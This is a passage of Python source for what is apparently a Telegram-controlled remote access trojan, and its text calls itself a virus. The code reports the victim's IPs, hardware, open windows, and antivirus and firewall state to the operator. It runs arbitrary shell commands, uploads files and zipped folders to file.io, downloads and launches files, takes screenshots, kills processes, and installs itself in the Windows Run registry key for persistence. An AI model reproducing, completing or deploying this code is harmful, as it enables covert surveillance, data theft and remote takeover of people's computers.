    else:
        bot.send_message(message.chat.id, "–ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞ —É–∂–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞.")
def stop_recording_command(message):
    global recording, chat_id
    if recording:
        stop_recording_screen()
        recording = False
    else:
        bot.send_message(message.chat.id, "–ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞ –Ω–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞.")
@bot.message_handler(func=lambda message: re.match(r'^[a-zA-Z]+\s+https?://\S+', message.text))
def process_link_browser(message):
    user_id = message.chat.id
    try:
        parts = message.text.split()
        browser = parts[0]
        link = parts[1]
        supported_browsers = ["opera", "yandex", "chrome", "firefox", "edge", "brave"]
        if browser.lower() not in supported_browsers:
            bot.send_message(user_id, "–ù–µ–≤–µ—Ä–Ω–æ –≤—ã–±—Ä–∞–Ω –±—Ä–∞—É–∑–µ—Ä. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –æ–¥–∏–Ω –∏–∑ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤.")
        else:
            result = open_link_in_browser(link, browser)
            if result:
                bot.send_message(user_id, result)
            else:
                bot.send_message(user_id, f"–û—Ç–∫—Ä—ã—Ç–∞ —Å—Å—ã–ª–∫–∞ –≤ –±—Ä–∞—É–∑–µ—Ä–µ {browser.capitalize()}: {link}")
                backcom
    except Exception as e:
        bot.send_message(user_id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
def open_link_in_browser(link, browser):
    try:
        browser_path = None
        if browser == "opera":
            browser_path = "C:\Program Files\Opera\launcher.exe"
        elif browser == "yandex":
            user_name = os.getlogin()
            browser_path = r"C:\Users\{user_name}\AppData\Local\Yandex\YandexBrowser\Application\browser.exe"
        elif browser == "chrome":
            browser_path = "C:\Program Files\Google\Chrome\Application\chrome.exe"
        elif browser == "firefox":
            browser_path = "C:\Program Files\Mozilla Firefox\firefox.exe"
        elif browser == "edge":
            browser_path = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        elif browser == "brave":
            browser_path = "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
        if browser_path:
            webbrowser.register(browser, None, webbrowser.BackgroundBrowser(browser_path))
            webbrowser.get(browser).open(link)
        else:
            return f"–ë—Ä–∞—É–∑–µ—Ä {browser.capitalize()} –Ω–µ –Ω–∞–π–¥–µ–Ω."
    except Exception as e:
        return f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}"
        backcom
def find_and_save_files(output_filename, folders_to_search, file_extensions):
    files_list = []
    for folder in folders_to_search:
        for root, _, files in os.walk(folder):
            for file in files:
                if file.lower().endswith(file_extensions):
                    files_list.append(os.path.join(root, file))
    with open(output_filename, "w", encoding="utf-8") as file:
        for file_item in files_list:
            file.write(file_item + "\n")
    return files_list
def find_and_save_archives(output_filename, folders_to_search):
    archives_list = []
    for folder in folders_to_search:
        for root, _, files in os.walk(folder):
            for file in files:
                if file.lower().endswith((".rar", ".zip", ".iso", ".7z", "arj", "lim", "ain", "ace", "zoo", "lzh", "gz", "gzip", "tar")):
                    archives_list.append(os.path.join(root, file))
    with open(output_filename, "w", encoding="utf-8") as file:
        for archive_item in archives_list:
            file.write(archive_item + "\n")
    return archives_list
text_document_extensions = (".txt", ".docx", ".rtf", ".doc", ".html", ".pdf", ".odt")
archive_extensions = (".rar", ".zip", ".iso", ".7z")
folders_to_search = [
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Desktop"),
]
text_documents = find_and_save_files("text_documents_list.txt", folders_to_search, text_document_extensions)
archives = find_and_save_archives("archives_list.txt", folders_to_search)
if text_documents:
    with open("text_documents_list.txt", "rb") as file:
        pass
    os.remove("text_documents_list.txt")
if archives:
    with open("archives_list.txt", "rb") as file:
        pass
    os.remove("archives_list.txt")
def get_external_ip_address():
    try:
        req = requests.get('https://api64.ipify.org?format=json')
        data = req.json()
        ip = data['ip']
        return ip
    except Exception as e:
        return "IP-–∞–¥—Ä–µ—Å –Ω–µ –Ω–∞–π–¥–µ–Ω"
def get_ip_address():
    try:
        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        return ip_address
    except Exception as e:
        return "IP-–∞–¥—Ä–µ—Å –Ω–µ –Ω–∞–π–¥–µ–Ω"  
def get_cpu_info():
    uname = platform.uname()
    return f"–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {uname.processor}"
def get_hardware_info():
    pythoncom.CoInitialize()
    try:
        hardware_info = "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∂–µ–ª–µ–∑–µ:\n"
        motherboard_info = wmi.WMI().Win32_BaseBoard()# –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –º–∞—Ç–µ—Ä–∏–Ω—Å–∫–æ–π –ø–ª–∞—Ç–µ
        if motherboard_info:
            hardware_info += f"–ú–∞—Ç–µ—Ä–∏–Ω—Å–∫–∞—è –ø–ª–∞—Ç–∞: {motherboard_info[0].Product}\n"
        processor_info = wmi.WMI().Win32_Processor()# –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ
        if processor_info:
            hardware_info += f"–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {processor_info[0].Name}\n"
        bios_info = wmi.WMI().Win32_BIOS()# –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ BIOS
        if bios_info:
            hardware_info += f"BIOS: {bios_info[0].Manufacturer} {bios_info[0].Version}\n"
        disk_info = wmi.WMI().Win32_DiskDrive()# –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –¥–∏—Å–∫–∞—Ö        
        if disk_info:
            disk_size_gb = float(disk_info[0].Size) / (1024 ** 3)
            hardware_info += f"–ñ–µ—Å—Ç–∫–∏–π –¥–∏—Å–∫: {disk_info[0].Model} ({disk_size_gb:.2f} –ì–ë)\n"   
        battery_info = wmi.WMI().Win32_Battery()#–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞—Ç–∞—Ä–µ–µ (–µ—Å–ª–∏ —ç—Ç–æ –Ω–æ—É—Ç–±—É–∫)
        if battery_info:
            hardware_info += f"–ë–∞—Ç–∞—Ä–µ—è: {battery_info[0].DeviceID}\n"
        return hardware_info
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∂–µ–ª–µ–∑–µ: {str(e)}"
    pythoncom.CoUninitialize()
def get_gpu_info():
    try:
        gpu_list = GPUtil.getGPUs()
        if gpu_list:
            gpu_info = "\n".join([f"–í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞ {i + 1}:\n–ú–æ–¥–µ–ª—å: {gpu.name}\nVRAM: {gpu.memoryTotal} –ú–ë\n"
                                  f"–ó–∞–≥—Ä—É–∑–∫–∞: {gpu.load * 100:.2f}%\n–¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞: {gpu.temperature}¬∞C"
                                  for i, gpu in enumerate(gpu_list)])
        else:
            gpu_info = "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤–∏–¥–µ–æ–∫–∞—Ä—Ç–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞."
    except Exception as e:
        gpu_info = f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –≤–∏–¥–µ–æ–∫–∞—Ä—Ç–µ: {str(e)}"
    return gpu_info
def get_monitor_info():
    monitors = get_monitors()
    monitor_info = []
    for monitor in monitors:
        monitor_info.append(f"–ú–æ–Ω–∏—Ç–æ—Ä: {monitor.name} ({monitor.width}x{monitor.height})")
    return "\n".join(monitor_info)
def get_window_titles():
    window_titles = pygetwindow.getAllTitles()
    return window_titles
def get_user_info():
        user_info = ""
        try:
            user_info = "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ:\n"
            user_info += f"–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {os.getlogin()}\n"
            user_info += f"–î–æ–º–µ–Ω: {os.getenv('USERDOMAIN')}\n"
            user_info += f"–ò–º—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: {os.getenv('COMPUTERNAME')}\n"
        except Exception as e:
            user_info = f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ: {e}"
        return user_info
def get_security_info():
    current_directory = os.getcwd()
    access_rights = os.access(current_directory, os.R_OK)
    antivirus_status = "Enabled"
    try:
        antivirus_status_output = subprocess.check_output(["powershell", "Get-MpComputerStatus"]).decode("utf-8")
        if "AMServiceEnabled" in antivirus_status_output:
            antivirus_status = "Disabled"
    except subprocess.CalledProcessError:
        pass
    firewall_status = "Enabled"
    try:
        firewall_status_output = subprocess.check_output(["netsh", "advfirewall", "show", "allprofiles", "state"], encoding="cp866")
        if "OFF" in firewall_status_output:
            firewall_status = "Disabled"
    except subprocess.CalledProcessError:
        pass
    security_info = f'''
–ü—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏: {"–î–æ—Å—Ç—É–ø–Ω—ã" if access_rights else "–û–≥—Ä–∞–Ω–∏—á–µ–Ω—ã"}
–°—Ç–∞—Ç—É—Å –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–≥–æ –ü–û: {antivirus_status}
–°—Ç–∞—Ç—É—Å –±—Ä–∞–Ω–¥–º–∞—É—ç—Ä–∞: {firewall_status}
'''
    return security_info
def get_computer_info():
    script_directory = os.path.dirname(os.path.abspath(__file__))
    uname = os.getlogin()
    windows = platform.platform()
    processor = get_cpu_info()
    memory_info = psutil.virtual_memory()
    disk_info = psutil.disk_usage('/')
    gpu_info = get_gpu_info()
    monitors_info = get_monitor_info()
    external_ip = get_external_ip_address()
    local_ip = get_ip_address()
    window_titles = get_window_titles()
    user_info = get_user_info()
    security_info = get_security_info()
    hardware_info = get_hardware_info()
    window_list = "\n".join([f"{i + 1}. {title}" for i, title in enumerate(window_titles, start=1) if title.strip()])
    
    info = f'''
–í–µ—Ä—Å–∏—è —Å–∫—Ä–∏–ø—Ç–∞: 1.7
–†–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–µ –≤–∏—Ä—É—Å–∞: {script_directory}

{user_info}
–í–Ω–µ—à–Ω–∏–π IP: {external_ip}
–õ–æ–∫–∞–ª—å–Ω—ã–π IP: {local_ip}

–û–°: {windows}
{processor}
{security_info}

{hardware_info}

–û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å: {memory_info.total / (1024 ** 3):.2f} –ì–ë
–î–æ—Å—Ç—É–ø–Ω–æ –º–µ—Å—Ç–∞ –Ω–∞ –¥–∏—Å–∫–µ: {disk_info.free / (1024 ** 3):.2f} –ì–ë
{gpu_info}
{monitors_info}

–°–ø–∏—Å–æ–∫ –æ–∫–æ–Ω:
{window_list}


'''
    return info
def send_computer_info(message):
    info = get_computer_info()
    file_path = "computer_info.txt"
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(info)
    with open(file_path, 'rb') as file:
        bot.send_document(message.chat.id, file)
        backcom
    os.remove(file_path)
def get_unique_running_processes():
    running_processes = set()
    for process in psutil.process_iter(attrs=['name']):
        process_name = process.info['name']
        running_processes.add(process_name)
    unique_processes = sorted(list(running_processes))
    return unique_processes
def send_process_list(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        unique_processes = get_unique_running_processes()
        if unique_processes:
            bot.send_message(my_id, "–°–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤:\n\n" + "\n".join(unique_processes))
            bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(my_id, "–°–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –ø—É—Å—Ç.")
            bot.register_next_step_handler(message, files_process)
    else:
        info_user(message)
        bot.register_next_step_handler(message, files_process)
def get_process_list():
    process_list = []
    for proc in psutil.process_iter(['pid', 'name']):
        process_name = proc.info['name']
        process_list.append(process_name)
    return process_list
def send_installed_programs_as_document(message):
    try:
        bot.send_message(my_id, "–°–∫–∞–Ω–∏—Ä–æ–≤–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞ –ø–æ–¥–æ–∂–¥–∏—Ç–µ, —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –¥–æ 5 –º–∏–Ω—É—Ç.")
        programs = get_installed_programs()
        if programs:
            file_path = "installed_programs.txt"
            if save_programs_to_file(programs, file_path):
                with open(file_path, "rb") as file:
                    bot.send_document(message.chat.id, file)
                os.remove(file_path)
                bot.register_next_step_handler(message, reply_markup=grabber_submenu_keyboard)
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–≥—Ä–∞–º–º –≤ —Ñ–∞–π–ª.")
                bot.register_next_step_handler(message, reply_markup=grabber_submenu_keyboard)
        else:
            bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º.")
    except Exception as e:
        print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}")
def get_installed_programs():
    try:
        programs = []
        result = subprocess.check_output("wmic product get name", shell=True, text=True, encoding='cp866')
        programs.extend([line.strip() for line in result.split("\n") if line.strip()])
        program_folders = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join(os.environ["LOCALAPPDATA"], "Programs"),
            os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join(os.environ["ProgramFiles"]),
            os.path.join(os.environ["ProgramFiles(x86)"]),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
            os.path.join(os.path.expanduser("~"), "Documents"),
        ]
        for folder in program_folders:
            if os.path.exists(folder):
                for root, _, files in os.walk(folder):
                    for file in files:
                        if file.endswith((".lnk", ".exe")):
                            programs.append(f"–ü—É—Ç—å: {os.path.join(root, file)}")
        return programs
    except Exception as e:
        print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º: {e}")
        return None
def save_programs_to_file(programs, file_path):
    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write("\n".join(programs))
        return True
    except Exception as e:
        print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º –≤ —Ñ–∞–π–ª: {e}")
        return False
def kill_process(message):
    try:
        bot.send_chat_action(my_id, "typing")
        process_name = message.text
        os.system("taskkill /IM " + process_name + " -F")
        bot.send_message(my_id, f"–ü—Ä–æ—Ü–µ—Å—Å \"{process_name}\" —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
    except Exception as e:
        bot.send_message(my_id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞: {str(e)}")
        bot.register_next_step_handler(message, files_process)
def handle_error(error, message):
    try:
        error_message = f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(error)}"
        bot.send_message(my_id, error_message)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –æ—à–∏–±–∫–∏: {str(e)}")
def back(message):
    try:
        bot.register_next_step_handler(message, get_text_messages)
        bot.send_message(my_id, "–í—ã –ø–æ–ø–∞–ª–∏ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", reply_markup=menu_keyboard)
    except Exception as e:
        handle_error(e, message)
def backcom():
    try:
        bot.register_next_step_handler(get_text_messages, reply_markup=menu_keyboard)
    except Exception as e:
        handle_error(e, )
def info_user(message):
	bot.send_chat_action(my_id, 'typing')
	alert = f"–ö—Ç–æ-—Ç–æ –ø—ã—Ç–∞–ª—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É: \"{message.text}\"\n\n"
	alert += f"user id: {str(message.from_user.id)}\n"
	alert += f"first name: {str(message.from_user.first_name)}\n"
	alert += f"last name: {str(message.from_user.last_name)}\n" 
	alert += f"username: @{str(message.from_user.username)}"
	bot.send_message(my_id, alert, reply_markup = menu_keyboard)
def start_process(message):
    try:
        bot.send_chat_action(my_id, 'typing')
        file_path = message.text
        if os.path.exists(file_path):
            os.startfile(r'' + file_path)
            bot.send_message(my_id, f"–§–∞–π–ª –ø–æ –ø—É—Ç–∏ \"{file_path}\" –∑–∞–ø—É—Å—Ç–∏–ª—Å—è", reply_markup=files_keyboard)
            bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(my_id, "–û—à–∏–±–∫–∞! –£–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–∞–π–ª", reply_markup=files_keyboard)
            bot.register_next_step_handler(message, files_process)
    except Exception as e:
        handle_error(e, message)
        bot.send_message(my_id, "–û—à–∏–±–∫–∞! –£–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–∞–π–ª", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
def cmd_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        command = message.text
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=False)
        encoding_info = chardet.detect(result.stdout)
        detected_encoding = encoding_info['encoding']
        if detected_encoding is None:
            detected_encoding = 'utf-8'
        output_text = result.stdout.decode(detected_encoding, errors='replace')
        with open("cmd_output.txt", "w", encoding="utf-8") as output_file:
            output_file.write(output_text)
        if not output_text.strip():
            bot.send_message(my_id, "–†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã –ø—É—Å—Ç.")
            backcom
        else:
            with open("cmd_output.txt", "rb") as file:
                bot.send_document(my_id, file)
                bot.send_message(my_id, "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞, —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ñ–∞–π–ª–µ")
                backcom
        bot.register_next_step_handler(message, addons_process)
    except Exception as e:
        bot.send_message(my_id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã: {str(e)}")
        bot.register_next_step_handler(message, addons_process)
        backcom
def downfile_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        file_path = message.text
        if os.path.exists(file_path):
            if os.path.isfile(file_path):
                bot.send_message(my_id, "–§–∞–π–ª –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...")
                bot.send_chat_action(my_id, 'upload_document')
                file_doc = open(file_path, 'rb')
                bot.send_document(my_id, file_doc)
                bot.register_next_step_handler(message, files_process)
            elif os.path.isdir(file_path):
                bot.send_message(my_id, "–ü–∞–ø–∫–∞ –∞—Ä—Ö–∏–≤–∏—Ä—É–µ—Ç—Å—è –∏ –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –Ω–∞ —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫, –ø–æ–¥–æ–∂–¥–∏—Ç–µ... –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –æ—Ç 1 –¥–æ 10 –º–∏–Ω—É—Ç, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤–µ—Å–∞ —Ñ–∞–π–ª–∞.")
                zip_filename = "archive.zip"
                with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as archive:
                    for foldername, subfolders, filenames in os.walk(file_path):
                        for filename in filenames:
                            filepath = os.path.join(foldername, filename)
                            archive.write(filepath, os.path.relpath(filepath, file_path))
                fileio_url = upload_to_fileio(zip_filename)
                if fileio_url:
                    os.remove(zip_filename)
                bot.send_message(my_id, f"–ê—Ä—Ö–∏–≤ —Å–æ–∑–¥–∞–Ω –∏ –∑–∞–≥—Ä—É–∂–µ–Ω: {fileio_url}")
                bot.register_next_step_handler(message, files_process)
            else:
                bot.send_message(my_id, "–£–∫–∞–∑–∞–Ω–Ω—ã–π –ø—É—Ç—å –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –Ω–∏ —Ñ–∞–π–ª–æ–º, –Ω–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–µ–π.")
                bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(my_id, "–§–∞–π–ª –∏–ª–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –∏–ª–∏ —É–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –ø—É—Ç—å.")
            bot.register_next_step_handler(message, files_process)
    except Exception as e:
        os.remove(zip_filename)
        bot.send_message(my_id, f"–û—à–∏–±–∫–∞: {str(e)}")
        bot.register_next_step_handler(message, files_process)
def upload_to_fileio(filename):
    try:
        with open(filename, 'rb') as file:
            response = requests.post('https://file.io', files={'file': file})
            data = response.json()
            if data['success']:
                return data['link']
            else:
                return None
    except Exception as e:
        return None
def uploadfile_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        current_directory = os.getcwd()
        file_location = os.path.join(current_directory, src)
        bot.send_message(my_id, f"–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω. \n–û–Ω –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ø–æ –ø—É—Ç–∏: \n{file_location}")
        bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "–û—à–∏–±–∫–∞! –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç")
        bot.register_next_step_handler(message, files_process)
def process_download(message):
    try:
        url = message.text
        User.urldown = url
        bot.send_message(message.chat.id, "–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞:")
        bot.register_next_step_handler(message, process_save)
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
MAX_FILE_SIZE = 1024 * 1024 * 1024  # –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Ñ–∞–π–ª–∞ - 1 –ì–ë
def process_save(message):
    try:
        save_path = message.text
        parsed_url = urlparse(User.urldown)
        filename = os.path.basename(parsed_url.path)
        file_path = os.path.join(save_path, filename)
        if not os.path.exists(save_path):
            os.makedirs(save_path)
        response = requests.get(User.urldown, stream=True)
        if response.status_code == 200:
            content_length = int(response.headers.get('content-length', 0))
            if content_length <= MAX_FILE_SIZE:
                with open(file_path, 'wb') as file:
                    for chunk in response.iter_content(chunk_size=1024):
                        file.write(chunk)
                bot.send_message(message.chat.id, f"–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω –ø–æ –ø—É—Ç–∏ \"{file_path}\"")
                bot.register_next_step_handler(message, files_process)
            else:
                bot.send_message(message.chat.id, f"–§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π. –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –¥–æ–ø—É—Å—Ç–∏–º—ã–π —Ä–∞–∑–º–µ—Ä: {MAX_FILE_SIZE} –±–∞–π—Ç.")
                bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(message.chat.id, "–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ —Å—Å—ã–ª–∫—É –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
            bot.register_next_step_handler(message, files_process)
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞: {str(e)}")
        bot.register_next_step_handler(message, files_process)
def messaga_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		MessageBox(None, message.text, 'Automatic', 0)
		bot.send_message(my_id, f"–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Å —Ç–µ–∫—Å—Ç–æ–º \"{message.text}\" –±—ã–ª–æ –∑–∞–∫—Ä—ã—Ç–æ")
	except:
		bot.send_message(my_id, "–û—à–∏–±–∫–∞")
def screen_process(message):
	try:
		get_screenshot()
		bot.send_photo(my_id, open("screen", "rb"))
		bot.register_next_step_handler(message, mouse_process)
		os.remove("screen.png")
		os.remove("screen.png")
	except:
			bot.send_chat_action(my_id, 'typing')
			bot.send_message(my_id, "–ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")
			bot.register_next_step_handler(message, mouse_process)
def get_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screen.png")
        return "screen.png"
    except Exception as e:
        return str(e)
        
def add_to_startup(script_path, add_for_all_users=False):
    # –û–ø—Ä–µ–¥–µ–ª–∏—Ç–µ –∫–ª—é—á —Ä–µ–µ—Å—Ç—Ä–∞, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–æ–≥–æ, –¥–æ–±–∞–≤–ª—è–µ—Ç–µ –ª–∏ –≤—ã —Å–∫—Ä–∏–ø—Ç –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–ª–∏ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
    if add_for_all_users:
        registry_key = winreg.HKEY_LOCAL_MACHINE
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    else:
        registry_key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    script_name = os.path.basename(script_path)
    key = winreg.OpenKey(registry_key, key_path, 0, winreg.KEY_WRITE)
    
    try:
        winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, script_path)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É: {str(e)}")
    finally:
        winreg.CloseKey(key)

